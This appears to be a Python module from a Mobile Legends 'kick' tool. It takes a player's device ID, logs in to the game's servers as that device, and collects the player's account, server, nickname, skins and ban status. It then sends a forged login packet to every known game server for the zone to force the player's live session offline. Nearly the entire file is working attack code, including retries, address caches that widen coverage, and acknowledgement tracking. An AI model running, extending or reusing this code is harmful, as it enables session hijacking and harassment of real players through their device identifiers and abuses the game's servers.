"""Kick engine — faithful port of brutetolslhoya's Brute/Game/Login.

Source semantics preserved:

  Login.run()      login server, packet 1 -> 2
  Game.srv()       packet 5 -> 6, split "host:port"
  Game.login2()    game server, 10001 -> wait 10002
  Game.lookup()    11153 -> 11154 (scan up to 2 frames, skip 20001, retry -1)
  Game.skin()      10143 -> 10144
  Game.bancheck()  10101, then scan for a ban field
  Brute.fetch()    login -> srv -> login2 -> lookup -> skin -> bancheck, 3 tries
  Brute.kick()     send 10001 to the game server, socket timeout 4.5s

Protocol constants are the source's own: CLI version 2.1.97.1232.1, channel
and_usa, login.ml.youngjoygame.com:30021.

The one deliberate change: everything takes a per-device delay from config so
a run can be paced. The source had none.
"""
import errno
import select
import socket
import threading
import time

import zstandard as zstd

from . import config as cfg
from .sdp import Conn, SdpStruct


# ── device id parsing (source: pecah()) ────────────────────────────────────
def split_device_id(dev):
    """and_<32 md5><16 android_id><rest adv> -> (raw, md5, aid, adv)."""
    raw = dev.strip()
    body = raw[4:] if raw.startswith(("and_", "ios_")) else raw
    md5 = body[:32] if len(body) >= 32 else body
    aid = body[32:48] if len(body) >= 48 else ""
    adv = body[48:] if len(body) > 48 else ""
    return raw, md5, aid, adv


# ── login server ───────────────────────────────────────────────────────────
class Login:
    """Source: Login.run() — authenticate the device id."""

    def __init__(self, dev):
        self.dev = dev
        self.acc = 0
        self.skey = ""
        self.zid = 0
        self.gh = ""
        self.gp = 0

    def run(self):
        raw, md5, aid, adv = split_device_id(self.dev)
        conn = Conn(cfg.KICK_HOST, cfg.KICK_PORT)
        try:
            conn.open(timeout=cfg.PROFILE_TIMEOUT)
            conn.send(1, SdpStruct({
                0: raw,
                1: f"gps_adid={adv}&android_id={aid}&device_unique_id={md5}",
                2: cfg.KICK_CLI_VERSION, 3: cfg.KICK_CHANNEL, 4: "en",
            }))
            pid, res = conn.recv()
            if pid != 2 or not res:
                return False
            self.acc = res.get(0)
            self.skey = res.get(1)
            zr = res.get(2)
            if isinstance(zr, dict):
                self.zid = zr.get(0, 0)
            elif isinstance(zr, list) and zr:
                first = zr[0]
                self.zid = first.get(0, 0) if isinstance(first, dict) else first
            else:
                self.zid = zr or 0
            return bool(self.acc and self.skey)
        except Exception:
            return False
        finally:
            conn.close()


# ── game server ────────────────────────────────────────────────────────────
class Game:
    """Source: Game.login1/srv/login2/lookup/skin/bancheck."""

    def __init__(self, dev):
        self.dev = dev
        self.acc = 0
        self.skey = ""
        self.zid = 0
        self.gh = ""
        self.gp = 0
        self.ban = "NORMAL"
        self.conn = None

    # -- source: login1() (login server side) -----------------------------
    def login1(self):
        raw, md5, aid, adv = split_device_id(self.dev)
        self.conn = Conn(cfg.KICK_HOST, cfg.KICK_PORT)
        self.conn.open(timeout=cfg.PROFILE_TIMEOUT)
        self.conn.send(1, SdpStruct({
            0: raw,
            1: f"gps_adid={adv}&android_id={aid}&device_unique_id={md5}",
            2: cfg.KICK_CLI_VERSION, 3: cfg.KICK_CHANNEL, 4: "en",
        }))
        pid, res = self.conn.recv()
        if pid != 2 or not res:
            self.conn.close()
            return False
        self.acc = res.get(0)
        self.skey = res.get(1)
        zr = res.get(2)
        if isinstance(zr, dict):
            self.zid = zr.get(0, 0)
        elif isinstance(zr, list) and zr:
            first = zr[0]
            self.zid = first.get(0, 0) if isinstance(first, dict) else first
        else:
            self.zid = zr or 0
        return bool(self.acc and self.skey)

    # -- source: srv() ----------------------------------------------------
    def srv(self):
        self.conn.send(5, SdpStruct({
            0: self.acc, 1: self.skey, 2: cfg.VER, 5: self.zid, 6: cfg.CHAN,
        }))
        pid, res = self.conn.recv()
        if pid != 6 or not res:
            return False
        addr = res.get(1)
        if not addr or ":" not in str(addr):
            return False
        h, p = str(addr).split(":", 1)
        self.gh, self.gp = h, int(p)
        return True

    # -- source: login2() -------------------------------------------------
    def login2(self):
        self.conn.close()
        self.conn = Conn(self.gh, self.gp)
        self.conn.open(timeout=cfg.PROFILE_TIMEOUT)
        self.conn.send(10001, SdpStruct({
            0: self.acc, 1: self.skey, 2: self.zid,
            4: cfg.VER, 13: cfg.CHAN, 15: self.dev,
        }))
        for _ in range(3):
            pid, _res = self.conn.recv()
            if pid == 10002:
                return True
            if pid is None:
                return False
        return False

    # -- source: lookup() -------------------------------------------------
    def lookup(self, rid, tries=None):
        """11153 -> 11154, reading the nickname out of the reply.

        Returns the nickname string, or "" when it could not be read. Scans a
        few frames, skips 20001, and retries a timeout. The frame budget is
        generous because a miss here is what used to produce a fake
        "Player_<acc>" name in the panel.
        """
        tries = tries or 3
        for attempt in range(tries):
            self.conn.send(11153, SdpStruct({1: int(rid)}))
            for _ in range(4):
                pid, res = self.conn.recv()
                if pid == 20001:
                    continue
                if pid == -1:
                    break                      # timeout: re-send and try again
                if pid is None:
                    return ""
                if pid != 11154 or not res:
                    continue
                nick = _read_nick(res)
                if nick:
                    return nick
                break                          # got the frame, no name in it
        return ""

    # -- source: skin() ---------------------------------------------------
    def skin(self, rid, zid):
        """10143 -> 10144, up to 4 frames."""
        self.conn.send(10143, SdpStruct({0: int(rid), 1: int(zid)}))
        for _ in range(4):
            pid, res = self.conn.recv()
            if pid == 10144 and res:
                return res
            if pid == 20001:
                continue
            if pid is None:
                return None
        return None

    # -- source: bancheck() -----------------------------------------------
    def bancheck(self):
        """10101, then look for a ban field in whatever comes back.

        The source sets self.ban='BANNED' when it finds a dict that contains a
        truthy 'ban' entry. Kept as-is: this is a field sniff, not the packet
        20001 verdict.
        """
        self.conn.send(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.conn.recv()
            if pid == 20001:
                continue
            if isinstance(res, dict):
                b = res.get("ban")
                if b:
                    self.ban = "BANNED"
                    return self.ban
            if pid is None or pid == -1:
                break
        return self.ban


# ── profile + kick ─────────────────────────────────────────────────────────
def _read_nick(res):
    """Pull the nickname out of a 11154 reply.

    Measured shape: field 0 is a list whose first element is a struct with the
    name in field 2, e.g. {0: [{0: <acc>, 1: <zone>, 2: '<nick>'}]}. Some
    replies nest the same struct in field 6/5 as raw bytes, so those are
    unwrapped too. Returns "" when there is no usable name.
    """
    if not res:
        return ""
    candidates = []
    lst = res.get(0)
    if isinstance(lst, list) and lst:
        candidates.append(lst[0])
    elif isinstance(lst, (dict,)) or hasattr(lst, "get"):
        candidates.append(lst)
    raw = res.get(6) or res.get(5)
    if isinstance(raw, bytes):
        try:
            inner = SdpStruct(raw)
            inner_lst = inner.get(0)
            if isinstance(inner_lst, list) and inner_lst:
                candidates.append(inner_lst[0])
            else:
                candidates.append(inner)
        except Exception:
            pass
    for c in candidates:
        if c is None:
            continue
        name = None
        if hasattr(c, "get"):
            name = c.get(2)
        if isinstance(name, dict):
            name = name.get(0)
        if isinstance(name, str) and name.strip():
            return name.strip()
    return ""


# ── name cache ─────────────────────────────────────────────────────────────
# device_id -> (acc, nick) and acc -> nick. A run used to start with a blank
# slate, so a name resolved in one run showed as "?" in the next and the user
# had to scroll up to find it. The cache is keyed by device id and by account
# id so either one can restore the name.
_NAME_BY_DEVICE = {}
_NAME_BY_ACC = {}
_NAME_CACHE_MAX = 20000
_NAME_LOCK = threading.Lock()


def cache_name(device_id=None, acc=None, nick=None):
    """Remember a resolved name. Ignores empty names."""
    if not nick or not str(nick).strip():
        return
    nick = str(nick).strip()
    with _NAME_LOCK:
        if device_id:
            if len(_NAME_BY_DEVICE) >= _NAME_CACHE_MAX:
                _NAME_BY_DEVICE.clear()
            _NAME_BY_DEVICE[device_id] = (acc, nick)
        if acc:
            if len(_NAME_BY_ACC) >= _NAME_CACHE_MAX:
                _NAME_BY_ACC.clear()
            _NAME_BY_ACC[acc] = nick


def cached_name(device_id=None, acc=None):
    """(acc, nick) from the cache, or (None, ""). Device id wins over acc."""
    with _NAME_LOCK:
        if device_id and device_id in _NAME_BY_DEVICE:
            a, n = _NAME_BY_DEVICE[device_id]
            return (a, n)
        if acc and acc in _NAME_BY_ACC:
            return (acc, _NAME_BY_ACC[acc])
    return (None, "")


# ── game-server address cache ──────────────────────────────────────────────
# zone_id -> ordered list of "host:port" seen for that zone.
#
# The login server load balances per ACCOUNT: measured here, one account always
# gets the same address (8/8 logins) while four different accounts got four
# different addresses. So an account's live session sits on the address the
# login handed us — but the account may also be reachable on an address seen
# for another account in the same zone. Remembering every address per zone and
# kicking all of them is what widens coverage.
_GS_BY_ZONE = {}
_GS_MAX_PER_ZONE = 64
_GS_LOCK = threading.Lock()

# ACKs from the most recent kick_many() call, so the caller can report
# "ACK x2/3" instead of a bare "sent".
_LAST_ACKS = [0]
_LAST_SENT = [0]


def remember_game_server(zone_id, gs_info):
    """Record a game-server address for this zone (newest first)."""
    if not gs_info or ":" not in str(gs_info):
        return
    with _GS_LOCK:
        lst = _GS_BY_ZONE.setdefault(zone_id, [])
        if gs_info in lst:
            lst.remove(gs_info)
        lst.insert(0, gs_info)
        del lst[_GS_MAX_PER_ZONE:]


def known_game_servers(zone_id):
    with _GS_LOCK:
        return list(_GS_BY_ZONE.get(zone_id, []))


def seed_game_servers(zone_id, addresses):
    for a in addresses:
        remember_game_server(zone_id, a.strip())


def last_ack_counts():
    return _LAST_SENT[0], _LAST_ACKS[0]


class ProfileError(Exception):
    def __init__(self, reason, detail="", retryable=False):
        super().__init__(reason)
        self.reason = reason
        self.detail = detail
        self.retryable = retryable


def fetch_profile(device_id, attempts=None):
    """Source: Brute.fetch() — build the profile, retrying up to 3 times.

    Returns a dict with acc/skey/zid/gh/gp/nick/skin/ban.
    Raises ProfileError when the device id cannot be resolved at all.
    """
    attempts = attempts or cfg.PROFILE_ATTEMPTS
    last = None
    for _ in range(attempts):
        g = Game(device_id)
        try:
            if not g.login1():
                last = ProfileError("device id ga valid / gagal login",
                                    "packet 1 -> 2 failed", retryable=True)
                continue
            if not g.srv():
                last = ProfileError("game server tidak dikasih",
                                    "packet 5 -> 6 failed", retryable=True)
                continue
            if not g.login2():
                last = ProfileError("gagal masuk game server",
                                    "10001 -> 10002 failed", retryable=True)
                continue

            nick = ""
            skin = {}
            if cfg.BF_LOOKUP:
                nick = g.lookup(g.acc)
            # Reuse a name resolved earlier (another run, or an earlier loop)
            # instead of starting blank — that is what made the same device
            # show "?" in a new run while the name sat in an older message.
            if not nick:
                _c_acc, _c_nick = cached_name(g.dev, g.acc)
                if _c_nick:
                    nick = _c_nick
            if nick:
                cache_name(device_id=g.dev, acc=g.acc, nick=nick)
            # No invented name. If the lookup did not return one, the panel
            # shows "?" so a failed lookup is never mistaken for a real
            # nickname (it used to print "Player_<acc>", which read like a
            # genuine name and hid the failure).

            sr = g.skin(g.acc, g.zid)
            if sr:
                # The tier counts live in field 118 -> key 4
                # (e.g. {4: {1: 19, 2: 1}} = 19 Common, 1 Exceptional).
                # Measured against the live server; the source stored the raw
                # reply without reading it.
                t118 = sr.get(118)
                if isinstance(t118, dict):
                    tier = t118.get(4)
                    if isinstance(tier, dict) and tier:
                        skin = tier
                if not skin:
                    for k in (4, 0, 1):
                        v = sr.get(k)
                        if isinstance(v, dict) and v:
                            skin = v
                            break

            g.bancheck()
            # Remember this zone's address so later kicks can fan out to
            # everything known for it.
            remember_game_server(g.zid, f"{g.gh}:{g.gp}")
            return {
                "device_id": device_id,
                "acc": g.acc, "skey": g.skey, "zid": g.zid,
                "gh": g.gh, "gp": g.gp,
                "nick": str(nick).strip(), "skin": skin, "ban": g.ban,
            }
        except Exception as e:
            last = ProfileError(f"{type(e).__name__}: {e}", retryable=True)
        finally:
            if g.conn:
                g.conn.close()

    raise last or ProfileError("tidak bisa ambil profil", retryable=True)


def _kick_frame(profile):
    body = SdpStruct({
        0: profile["acc"], 1: profile["skey"], 2: profile["zid"],
        4: cfg.VER, 13: cfg.CHAN, 15: profile["device_id"],
    }).data
    pkt = SdpStruct({0: 10001, 1: 1, 5: body}).data
    comp = zstd.compress(pkt)
    return ((len(comp) + 4) | (16 << 24)).to_bytes(4, "big") + comp


def _kick_many(servers, frame, connect_timeout, ack_wait):
    """Send the kick to many game servers from a SINGLE thread.

    One thread per server does not scale (threads = workers x servers), so the
    non-blocking connects and the ACK reads are fanned out with select() and
    the thread count stays one per kick. Ported from Sumire.

    Returns {gs: (sent, acked)}.
    """
    out = {}
    socks = {}
    for gs in servers:
        host, _, port = gs.partition(":")
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except Exception:
                pass
            rc = s.connect_ex((host, int(port)))
            if rc not in (0, errno.EINPROGRESS, errno.EWOULDBLOCK, errno.EALREADY):
                out[gs] = (False, False)
                s.close()
                continue
            socks[gs] = s
            out[gs] = (False, False)
        except Exception:
            out[gs] = (False, False)
            if s:
                try:
                    s.close()
                except Exception:
                    pass
    if not socks:
        return out

    # phase 1: wait for every connect to finish, then send
    pending = dict(socks)
    deadline = time.time() + connect_timeout
    sent_at = {}
    while pending and time.time() < deadline:
        wl = list(pending.values())
        try:
            _, writable, exceptional = select.select([], wl, wl,
                                                     max(0, deadline - time.time()))
        except Exception:
            break
        for s in writable + exceptional:
            gs = next((g for g, so in pending.items() if so is s), None)
            if gs is None:
                continue
            pending.pop(gs, None)
            try:
                if s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) != 0:
                    continue
                s.setblocking(True)
                s.settimeout(max(0.05, deadline - time.time()))
                s.sendall(frame)
                s.setblocking(False)
                out[gs] = (True, False)
                sent_at[gs] = time.time()
            except Exception:
                pass

    # phase 2: read the ACKs (packet 10002)
    if ack_wait and sent_at:
        want = {gs: s for gs, s in socks.items() if out.get(gs, (False,))[0]}
        bufs = {gs: b"" for gs in want}
        ack_deadline = max(sent_at.values()) + ack_wait
        while want and time.time() < ack_deadline:
            rl = list(want.values())
            try:
                readable, _, _ = select.select(rl, [], [],
                                               max(0, ack_deadline - time.time()))
            except Exception:
                break
            for s in readable:
                gs = next((g for g, so in want.items() if so is s), None)
                if gs is None:
                    continue
                try:
                    d = s.recv(4096)
                except Exception:
                    d = b""
                if not d:
                    want.pop(gs, None)
                    continue
                bufs[gs] += d
                if len(bufs[gs]) >= 4:
                    sz = int.from_bytes(bufs[gs][:4], "big") & 0xFFFFFF
                    if len(bufs[gs]) >= sz:
                        payload = bufs[gs][4:sz]
                        try:
                            payload = zstd.decompress(payload)
                        except Exception:
                            pass
                        if SdpStruct(payload).get(0) == 10002:
                            out[gs] = (out[gs][0], True)
                        want.pop(gs, None)

    for s in socks.values():
        try:
            s.close()
        except Exception:
            pass
    return out


def kick(profile, timeout=None, servers=None):
    """Kick the session, fanning out to every known game server for the zone.

    Coverage matters: the login server load balances per account, so the
    address we were handed is the one the session sits on — but the account may
    also be reachable on an address learned from another account in the same
    zone. All of them are kicked at once (same wall time as kicking one, since
    the connects overlap) from a single thread.

    Returns (ok, elapsed_ms, description).
    """
    timeout = timeout or cfg.KICK_TIMEOUT
    t0 = time.time()

    if servers is None:
        servers = known_game_servers(profile.get("zid"))
        own = f"{profile.get('gh')}:{profile.get('gp')}"
        if own and own not in servers:
            servers = [own] + servers
    servers = list(dict.fromkeys(s for s in servers if s and ":" in s))
    if not servers:
        return False, 0.0, "no game server known"
    if not cfg.BF_KICK_ALL_SERVERS:
        servers = servers[:1]

    frame = _kick_frame(profile)
    results = _kick_many(servers, frame, timeout, cfg.BF_ACK_WAIT)
    sent = sum(1 for v in results.values() if v[0])
    acked = sum(1 for v in results.values() if v[1])
    _LAST_SENT[0] = sent
    _LAST_ACKS[0] = acked
    ms = (time.time() - t0) * 1000

    if sent == 0:
        return False, ms, "GAME SERVER REFUSED"
    if len(servers) == 1:
        desc = "ACK RECEIVED" if acked else "SENT (no ack)"
    else:
        desc = (f"ACK ×{acked}/{len(servers)} server" if acked
                else f"SENT ×{sent}/{len(servers)} server")
    return True, ms, desc


def kick_once(device_id, want_lookup=True):
    """Resolve the profile then kick once. Returns (ok, message, profile|None)."""
    try:
        profile = fetch_profile(device_id)
    except ProfileError as e:
        return False, f"❌ {e.reason}", None
    if not want_lookup:
        profile["nick"] = ""
    if cfg.MLBB_GS_SEED:
        seed_game_servers(profile.get("zid"), cfg.MLBB_GS_SEED)
    ok, ms, desc = kick(profile)
    who = f"{profile['acc']} · {profile['nick']}" if profile.get("nick") else str(profile["acc"])
    if not ok:
        return False, f"❌ kick gagal: {desc} · {who}", profile
    return True, f"✅ {desc} · {ms:.0f}ms · {who}", profile
